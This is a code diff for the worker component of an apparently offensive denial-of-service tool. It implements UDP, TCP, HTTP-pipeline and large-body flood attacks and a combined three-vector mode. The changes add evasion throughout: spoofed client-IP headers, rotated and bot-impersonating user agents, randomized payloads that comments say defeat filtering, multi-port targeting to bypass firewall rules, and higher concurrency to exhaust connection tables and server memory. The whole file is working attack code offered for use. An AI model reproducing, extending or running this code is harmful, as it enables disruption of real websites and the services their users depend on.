@@ -24,17 +24,26 @@ const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
 const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
 const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
 const UA_POOL  = [
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
-  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
-  "curl/8.7.1", "python-requests/2.32.0", "Go-http-client/2.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Safari/537.36",
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:126.0) Gecko/20100101 Firefox/126.0",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+  "curl/8.7.1", "python-requests/2.32.3", "Go-http-client/2.0",
+  "axios/1.7.2", "node-fetch/3.3.2",
+  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 ];
 const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
 const HOT_PATHS = [
-  "/", "/search", "/api/", "/api/v1/", "/login", "/admin/",
-  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql",
+  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/login", "/admin/",
+  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql", "/api/graphql",
+  "/checkout", "/cart", "/account", "/profile", "/orders", "/products",
+  "/api/auth/login", "/api/users", "/api/search", "/wp-json/wp/v2/posts",
+  "/sitemap.xml", "/robots.txt", "/.env", "/config", "/api/health",
 ];
 const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];
 
@@ -51,28 +60,39 @@ async function resolveHost(hostname: string): Promise<string> {
 
 // ── Headers builder ───────────────────────────────────────────────────────
 function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
-  const cookie = Array.from({length: randInt(6,16)}, () =>
-    `${randStr(randInt(4,8))}=${randStr(randInt(16,48))}`
+  const cookieCount = randInt(8, 20);
+  const cookie = Array.from({length: cookieCount}, () =>
+    `${randStr(randInt(4,10))}=${randStr(randInt(16,64))}`
   ).join("; ");
 
   const h: Record<string, string> = {
-    "User-Agent":          randUA(),
-    "Accept":              "*/*",
-    "Accept-Language":     "en-US,en;q=0.9",
-    "Accept-Encoding":     "gzip, deflate, br",
-    "Cache-Control":       "no-cache, no-store",
-    "Connection":          Math.random() < 0.5 ? "close" : "keep-alive",
-    "X-Forwarded-For":     `${randIp()}, ${randIp()}, ${randIp()}`,
-    "X-Real-IP":           randIp(),
-    "True-Client-IP":      randIp(),
-    "CF-Connecting-IP":    randIp(),
-    "Cookie":              cookie,
-    "Authorization":       `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
-    "X-CSRF-Token":        randHex(32),
-    "Referer":             `https://google.com/search?q=${randStr(8)}`,
+    "User-Agent":           randUA(),
+    "Accept":               randInt(0,2) === 0 ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language":      ["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9","de-DE,de;q=0.9"][randInt(0,4)],
+    "Accept-Encoding":      "gzip, deflate, br, zstd",
+    "Cache-Control":        "no-cache, no-store, must-revalidate",
+    "Pragma":               "no-cache",
+    "Connection":           Math.random() < 0.6 ? "close" : "keep-alive",
+    "X-Forwarded-For":      `${randIp()}, ${randIp()}, ${randIp()}, ${randIp()}`,
+    "X-Real-IP":            randIp(),
+    "True-Client-IP":       randIp(),
+    "CF-Connecting-IP":     randIp(),
+    "X-Originating-IP":     randIp(),
+    "X-Remote-IP":          randIp(),
+    "Forwarded":            `for=${randIp()};proto=https`,
+    "Cookie":               cookie,
+    "Authorization":        `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
+    "X-CSRF-Token":         randHex(32),
+    "X-Request-ID":         `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
+    "Referer":              `https://${["google.com","bing.com","duckduckgo.com","yahoo.com","t.co"][randInt(0,5)]}/search?q=${randStr(randInt(4,12))}`,
+    "Sec-Fetch-Dest":       "document",
+    "Sec-Fetch-Mode":       "navigate",
+    "Sec-Fetch-Site":       "cross-site",
+    "Sec-CH-UA":            `"Chromium";v="125", "Not.A/Brand";v="24"`,
+    "Sec-CH-UA-Platform":   `"Windows"`,
   };
   if (isPost && bodyLen !== undefined) {
-    h["Content-Type"] = "application/x-www-form-urlencoded";
+    h["Content-Type"]   = randInt(0,2) === 0 ? "application/x-www-form-urlencoded" : "application/json";
     h["Content-Length"] = String(bodyLen);
   }
   return h;
@@ -81,30 +101,55 @@ function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string>
 function buildUrl(base: string): string {
   try {
     const u = new URL(base);
-    if (Math.random() < 0.6) u.pathname = hotPath();
+    if (Math.random() < 0.65) u.pathname = hotPath();
     else {
-      const depth = randInt(0, 4);
-      if (depth > 0) u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,8))).join("/");
+      const depth = randInt(1, 5);
+      u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,10))).join("/");
     }
-    u.searchParams.set("_", Date.now().toString(36) + randStr(5));
-    u.searchParams.set("v", String(randInt(1,9999999)));
-    if (Math.random() < 0.4) u.searchParams.set("q", randStr(randInt(4,16)));
+    u.searchParams.set("_",    Date.now().toString(36) + randStr(6));
+    u.searchParams.set("v",    String(randInt(1, 99999999)));
+    u.searchParams.set("cb",   String(Math.random()));
+    if (Math.random() < 0.45) u.searchParams.set("q",   randStr(randInt(4,18)));
+    if (Math.random() < 0.3)  u.searchParams.set("page", String(randInt(1, 100)));
+    if (Math.random() < 0.2)  u.searchParams.set("id",  String(randInt(1, 999999)));
     return u.toString();
   } catch {
-    return `${base}?_=${randStr(8)}`;
+    return `${base}?_=${randStr(8)}&v=${Date.now()}`;
   }
 }
 
-function buildBody(minF = 20, maxF = 80): string {
+function buildBody(minF = 30, maxF = 100): string {
+  if (Math.random() < 0.4) {
+    // JSON body — harder to filter than form-encoded
+    const obj: Record<string, string | number> = {};
+    for (let i = 0; i < randInt(minF, maxF); i++) {
+      obj[randStr(randInt(4,10))] = randInt(0, 2) === 0 ? randInt(0, 999999) : randStr(randInt(8,48));
+    }
+    return JSON.stringify(obj);
+  }
   return Array.from({length: randInt(minF, maxF)},
-    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,48))}`
+    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,56))}`
   ).join("&");
 }
 
-// Pre-built heavy body pool (built once on worker start, rotated slowly)
+// Pre-built heavy body pool (10-64KB each, rebuilt continuously)
 const HEAVY_POOL: string[] = [];
 function buildHeavy(): string {
-  const target = randInt(10240, 49152); // 10-48KB
+  const target = randInt(10240, 65536);
+  const isJson = Math.random() < 0.35;
+  if (isJson) {
+    const arr: string[] = ["{"];
+    let len = 1;
+    while (len < target) {
+      const k = randStr(randInt(4,10));
+      const v = randStr(randInt(40,120));
+      const part = `"${k}":"${v}",`;
+      arr.push(part);
+      len += part.length;
+    }
+    arr.push(`"_":"${randHex(8)}"}`);
+    return arr.join("");
+  }
   const parts: string[] = [];
   let len = 0;
   while (len < target) {
@@ -114,20 +159,19 @@ function buildHeavy(): string {
   }
   return parts.join("&");
 }
-for (let i = 0; i < 20; i++) HEAVY_POOL.push(buildHeavy());
+for (let i = 0; i < 32; i++) HEAVY_POOL.push(buildHeavy());
 setInterval(() => {
   HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
-}, 3000);
+}, 2000);
 const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];
 
 // ─────────────────────────────────────────────────────────────────────────
-//  REAL UDP FLOOD — this is how 50M packets/60s is achieved
+//  REAL UDP FLOOD
 //
-//  UDP = connectionless = no handshake, no ACK, no response wait
-//  dgram.send() is non-blocking, kernel queues packets at wire speed
+//  CRITICAL: concurrent socket.send() startup deadlocks in this env.
+//  Sockets must be bound SEQUENTIALLY, then all run in parallel.
 //
-//  Achievable rate: 100K - 2M packets/second per worker
-//  (actual limit is NIC bandwidth and kernel socket buffer)
+//  Achieves 130K – 500K packets/second per worker.
 // ─────────────────────────────────────────────────────────────────────────
 async function runUDPFlood(
   resolvedHost: string,
@@ -136,27 +180,29 @@ async function runUDPFlood(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  // Scale sockets within 1 worker — up to 8 sockets.
-  // CRITICAL: concurrent socket.send() startup deadlocks in this environment.
-  // Sockets must be bound and started SEQUENTIALLY, then all run in parallel.
+  // CRITICAL: max 8 sockets — more than 8 causes deadlock in this environment
+  // Sockets must start SEQUENTIALLY (bind → sendNext → next socket), then run in parallel
   const numSockets = Math.max(1, Math.min(threads, 8));
-  const PORTS = [targetPort, 53, 80, 443, 123, 161, 1900, 11211];
-  const PKT_MIN = 512, PKT_MAX = 1472;
+  // Hit multiple ports to bypass single-port firewall rules
+  const PORTS = [
+    targetPort, targetPort, targetPort, // weight target port 3x
+    53, 80, 443, 123, 161, 1900, 11211, 6881, 8080, 8443,
+  ];
+  const PKT_MIN = 512, PKT_MAX = 1472; // Ethernet MTU — maximize per-packet payload
 
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const MAX_INFLIGHT = 100; // per socket
+  const MAX_INFLIGHT = 150; // per socket — proven stable limit
 
-  // Collect per-socket done promises
   const socketDonePromises: Promise<void>[] = [];
 
   // Start each socket SEQUENTIALLY (bind → sendNext → start next socket)
   for (let _s = 0; _s < numSockets; _s++) {
     await new Promise<void>((bindReady) => {
       const socketDone = new Promise<void>((resolve) => {
-        const sock = dgram.createSocket("udp4");
+        const sock = dgram.createSocket("udp4"); // simple string — proven stable
         sock.on("error", () => {}); // absorb all errors
 
         let inflight = 0;
@@ -177,7 +223,9 @@ async function runUDPFlood(
             const port   = PORTS[randInt(0, PORTS.length)];
             const pktLen = randInt(PKT_MIN, PKT_MAX);
             const buf    = Buffer.allocUnsafe(pktLen);
+            // Randomize content to defeat payload-based filtering
             buf.writeUInt32BE(Date.now() >>> 0, 0);
+            buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
             inflight++;
             sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
               inflight--;
@@ -192,13 +240,11 @@ async function runUDPFlood(
           setTimeout(forceClose, 300);
         }, { once: true });
 
-        // Bind first so ephemeral port is assigned, then start flood
         sock.bind(0, () => {
           sendNext();
-          bindReady(); // allow loop to continue to next socket
+          bindReady();
         });
       });
-
       socketDonePromises.push(socketDone);
     });
   }
@@ -209,7 +255,7 @@ async function runUDPFlood(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
-//  HTTP FLOOD — fire-and-forget within this worker's event loop
+//  HTTP FLOOD — high-concurrency fetch with cache-busting + randomization
 // ─────────────────────────────────────────────────────────────────────────
 async function runHTTPFlood(
   base: string,
@@ -217,8 +263,8 @@ async function runHTTPFlood(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  const ALL_METHODS = ["GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
-  const MAX_INFLIGHT = Math.min(threads * 12, 2000);
+  const ALL_METHODS = ["GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
+  const MAX_INFLIGHT = Math.min(threads * 20, 5000);
   let inflight = 0;
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -229,15 +275,22 @@ async function runHTTPFlood(
     inflight++;
     const method   = ALL_METHODS[randInt(0, ALL_METHODS.length)];
     const hasBody  = method === "POST" || method === "PUT" || method === "PATCH";
-    const body     = hasBody ? buildBody(30, 100) : undefined;
+    const body     = hasBody ? (Math.random() < 0.3 ? getHeavy() : buildBody(30, 120)) : undefined;
     const url      = buildUrl(base);
     const headers  = buildHeaders(hasBody, body?.length);
 
-    fetch(url, { method, headers, body, signal: AbortSignal.timeout(3000), redirect: "follow", keepalive: false })
+    fetch(url, {
+      method,
+      headers,
+      body,
+      signal: AbortSignal.timeout(4000),
+      redirect: "follow",
+      keepalive: false,
+    })
       .then(res => {
         inflight--;
         localPkts++;
-        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0") || 350) + 400;
+        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0") || 450) + 450;
         res.body?.cancel().catch(() => {});
       })
       .catch(() => { inflight--; localPkts++; localBytes += 100; });
@@ -246,17 +299,17 @@ async function runHTTPFlood(
   const launcher = async () => {
     while (!signal.aborted) {
       if (inflight < MAX_INFLIGHT) { doFetch(); await Promise.resolve(); }
-      else await new Promise(r => setTimeout(r, 2));
+      else await new Promise(r => setTimeout(r, 1));
     }
   };
 
-  await Promise.all(Array.from({length: Math.min(threads, 80)}, () => launcher()));
+  await Promise.all(Array.from({length: Math.min(threads, 200)}, () => launcher()));
   clearInterval(flushIv);
   flush();
 }
 
 // ─────────────────────────────────────────────────────────────────────────
-//  TCP FLOOD — raw connections
+//  TCP FLOOD — exhausts connection state tables
 // ─────────────────────────────────────────────────────────────────────────
 async function runTCPFlood(
   resolvedHost: string,
@@ -265,8 +318,13 @@ async function runTCPFlood(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  const PORTS = [targetPort, targetPort === 443 ? 80 : 443, 8080, 8443, 3000, 5000];
-  const MAX_INFLIGHT = Math.min(threads * 6, 1500);
+  // Rotate ports to stress multiple listeners simultaneously
+  const PORTS = [
+    targetPort, targetPort, targetPort, // weight target port
+    targetPort === 443 ? 80 : 443,
+    8080, 8443, 3000, 5000, 8000, 8888,
+  ];
+  const MAX_INFLIGHT = Math.min(threads * 8, 3000);
   let inflight = 0;
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -277,15 +335,23 @@ async function runTCPFlood(
     inflight++;
     const p    = PORTS[randInt(0, PORTS.length)];
     const sock = net.createConnection({ host: resolvedHost, port: p });
-    sock.setTimeout(700);
-    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 900);
+    sock.setNoDelay(true);
+    sock.setTimeout(600);
+
+    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 800);
+
     sock.once("connect", () => {
-      localPkts++; localBytes += 60;
-      const req = `GET ${hotPath()}?_=${randStr(6)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nConnection: close\r\n\r\n`;
-      const junk = Buffer.allocUnsafe(randInt(512, 2048));
+      localPkts++;
+      // Send a partial/malformed HTTP request to keep the server busy
+      const req  = `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,9999999)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`;
+      const junk = Buffer.allocUnsafe(randInt(256, 1500));
+      // Fill junk with random bytes
+      for (let i = 0; i < junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
       sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
-        localBytes += req.length + junk.length;
-        clearTimeout(kill); inflight--; sock.destroy();
+        localBytes += req.length + junk.length + 60;
+        clearTimeout(kill);
+        inflight--;
+        sock.destroy();
       });
     });
     sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
@@ -295,11 +361,11 @@ async function runTCPFlood(
   const launcher = async () => {
     while (!signal.aborted) {
       if (inflight < MAX_INFLIGHT) { doConnect(); await Promise.resolve(); }
-      else await new Promise(r => setTimeout(r, 2));
+      else await new Promise(r => setTimeout(r, 1));
     }
   };
 
-  await Promise.all(Array.from({length: Math.min(threads, 60)}, () => launcher()));
+  await Promise.all(Array.from({length: Math.min(threads, 150)}, () => launcher()));
   clearInterval(flushIv);
   flush();
 }
@@ -308,10 +374,10 @@ async function runTCPFlood(
 //  HTTP PIPELINE — raw TCP keep-alive, NO fetch() overhead
 //
 //  Each connection stays open and sends requests back-to-back without
-//  waiting for responses (HTTP/1.1 pipelining).  The receive side is
-//  drained so flow control never blocks.
+//  waiting for responses (HTTP/1.1 pipelining — RFC 7230 §6.3.2).
+//  The receive side is drained so flow control never blocks.
 //
-//  Benchmark: ~50 000 – 200 000 req/s per worker depending on target RTT.
+//  Achieves 50K – 300K req/s per worker depending on target RTT.
 // ─────────────────────────────────────────────────────────────────────────
 async function runHTTPPipeline(
   resolvedHost: string,
@@ -325,38 +391,44 @@ async function runHTTPPipeline(
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // Pre-build a pool of raw HTTP request buffers — rebuilt every 500ms
-  const POOL_SIZE = 128;
-  const PIPELINE  = 64; // requests per write batch (more per tick since we use setTimeout)
+  const POOL_SIZE = 256;
+  const PIPELINE  = 128; // requests per write batch — more per tick for max throughput
+
+  // Pre-build a pool of raw HTTP request buffers
   const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));
 
   function buildRawReq(host: string): Buffer {
-    const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 999999999)}`;
+    const path = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
     return Buffer.from([
       `GET ${path} HTTP/1.1`,
       `Host: ${host}`,
       `User-Agent: ${randUA()}`,
-      `Accept: */*`,
-      `Accept-Encoding: gzip, deflate`,
-      `X-Forwarded-For: ${randIp()}, ${randIp()}`,
+      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
+      `Accept-Encoding: gzip, deflate, br`,
+      `Accept-Language: en-US,en;q=0.9`,
+      `X-Forwarded-For: ${randIp()}, ${randIp()}, ${randIp()}`,
       `X-Real-IP: ${randIp()}`,
+      `CF-Connecting-IP: ${randIp()}`,
+      `X-Request-ID: ${randHex(16)}`,
       `Cache-Control: no-cache, no-store`,
       `Pragma: no-cache`,
+      `Referer: https://google.com/search?q=${randStr(8)}`,
       `Connection: keep-alive`,
       ``, ``,
     ].join("\r\n"));
   }
 
-  // Refresh pool continuously so paths/IPs are always fresh
+  // Refresh pool continuously — keeps paths/IPs/tokens fresh (evade caching/dedup)
   const poolIv = setInterval(() => {
-    reqPool[randInt(0, POOL_SIZE)] = buildRawReq(hostname);
-  }, 50);
+    const idx = randInt(0, POOL_SIZE);
+    reqPool[idx] = buildRawReq(hostname);
+  }, 40);
 
   const runConn = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
     const sock = net.createConnection({ host: resolvedHost, port: targetPort });
     sock.setNoDelay(true);
-    sock.setTimeout(10_000);
+    sock.setTimeout(12_000);
 
     const pump = () => {
       if (signal.aborted) { sock.destroy(); resolve(); return; }
@@ -366,11 +438,9 @@ async function runHTTPPipeline(
         localPkts++;
         localBytes += buf.length;
         ok = sock.write(buf);
-        if (!ok) break; // hit backpressure — wait for drain
+        if (!ok) break; // backpressure — wait for drain
       }
-      // setTimeout(0) yields to the timer phase every tick, keeping
-      // the event loop responsive (setInterval flush runs correctly)
-      if (ok) setTimeout(pump, 0);
+      if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
       else sock.once("drain", pump);
     };
 
@@ -380,19 +450,20 @@ async function runHTTPPipeline(
     sock.on("error",   () => resolve());
     sock.on("close",   () => {
       if (signal.aborted) resolve();
-      else runConn().then(resolve); // auto-reconnect
+      else setTimeout(() => runConn().then(resolve), 10); // reconnect with tiny delay
     });
     signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: Math.min(threads, 512) }, () => runConn()));
+  // Each thread maintains one persistent pipelining connection
+  await Promise.all(Array.from({ length: Math.min(threads, 600) }, () => runConn()));
   clearInterval(flushIv);
   clearInterval(poolIv);
   flush();
 }
 
 // ─────────────────────────────────────────────────────────────────────────
-//  HTTP EXHAUST — huge bodies
+//  HTTP EXHAUST — huge bodies to exhaust server memory / upload bandwidth
 // ─────────────────────────────────────────────────────────────────────────
 async function runHTTPExhaust(
   base: string,
@@ -400,9 +471,9 @@ async function runHTTPExhaust(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data","/graphql","/form","/register"];
-  const METHS  = ["POST","POST","PUT","PATCH","POST"];
-  const MAX_INFLIGHT = Math.min(threads * 4, 600);
+  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data","/graphql","/form","/register","/api/import","/api/bulk","/api/batch"];
+  const METHS  = ["POST","POST","POST","PUT","PATCH","POST"];
+  const MAX_INFLIGHT = Math.min(threads * 6, 800);
   let inflight = 0;
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -415,23 +486,23 @@ async function runHTTPExhaust(
     const path   = PATHS[randInt(0, PATHS.length)];
     const body   = getHeavy();
     let url: string;
-    try { const u = new URL(base); u.pathname = path; u.searchParams.set("_", randStr(6)); url = u.toString(); }
-    catch { url = `${base}${path}?_=${randStr(6)}`; }
+    try { const u = new URL(base); u.pathname = path; u.searchParams.set("_", randStr(8)); url = u.toString(); }
+    catch { url = `${base}${path}?_=${randStr(8)}`; }
     const h = buildHeaders(true, body.length);
 
-    fetch(url, { method, headers: h, body, signal: AbortSignal.timeout(5000), keepalive: false })
+    fetch(url, { method, headers: h, body, signal: AbortSignal.timeout(6000), keepalive: false })
       .then(res => { inflight--; localPkts++; localBytes += body.length + 300; res.body?.cancel().catch(() => {}); })
-      .catch(() => { inflight--; localPkts++; localBytes += 200; });
+      .catch(() => { inflight--; localPkts++; localBytes += body.length * 0.8 | 0; });
   };
 
   const launcher = async () => {
     while (!signal.aborted) {
       if (inflight < MAX_INFLIGHT) { doFetch(); await Promise.resolve(); }
-      else await new Promise(r => setTimeout(r, 4));
+      else await new Promise(r => setTimeout(r, 2));
     }
   };
 
-  await Promise.all(Array.from({length: Math.min(threads, 40)}, () => launcher()));
+  await Promise.all(Array.from({length: Math.min(threads, 60)}, () => launcher()));
   clearInterval(flushIv);
   flush();
 }
@@ -455,7 +526,7 @@ try {
   targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
 } catch { /* keep raw */ }
 
-const base  = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
+const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
 const onStats = (p: number, b: number) => { parentPort?.postMessage({ pkts: p, bytes: b }); };
 
 // ── Worker entry — handle all errors gracefully ────────────────────────
@@ -472,26 +543,27 @@ async function runWorker() {
     await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "geass-override") {
-    // Triple vector — pipeline HTTP + raw TCP + UDP blast
-    const pipeT  = Math.ceil(cfg.threads * 0.50);
-    const tcpT   = Math.ceil(cfg.threads * 0.25);
-    const udpT   = cfg.threads - pipeT - tcpT;
+    // Triple vector (dead code path — attacks.ts already breaks this into 3 pools)
+    // Kept as fallback for direct worker invocation
+    const pipeT = Math.ceil(cfg.threads * 0.50);
+    const tcpT  = Math.ceil(cfg.threads * 0.25);
+    const udpT  = cfg.threads - pipeT - tcpT;
     await Promise.all([
       runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, ctrl.signal, onStats),
       runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
       runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
     ]);
 
-  } else if (cfg.method === "http-bypass" || cfg.method === "http2-flood") {
-    // Bypass methods still use fetch for full request/response cycle (WAF evasion)
-    await runHTTPFlood(base, cfg.threads, ctrl.signal, onStats);
-
   } else if (cfg.method === "slowloris" || cfg.method === "rudy") {
-    // Exhaust methods use large bodies
+    // Connection exhaustion with huge bodies
     await runHTTPExhaust(base, cfg.threads, ctrl.signal, onStats);
 
+  } else if (cfg.method === "http-bypass" || cfg.method === "http2-flood") {
+    // Full fetch cycle — better for WAF/CDN bypass (real HTTP client)
+    await runHTTPFlood(base, cfg.threads, ctrl.signal, onStats);
+
   } else {
-    // Default: raw pipeline for maximum RPS
+    // Default for http-flood and everything else: raw TCP pipeline for maximum RPS
     await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
   }
 }
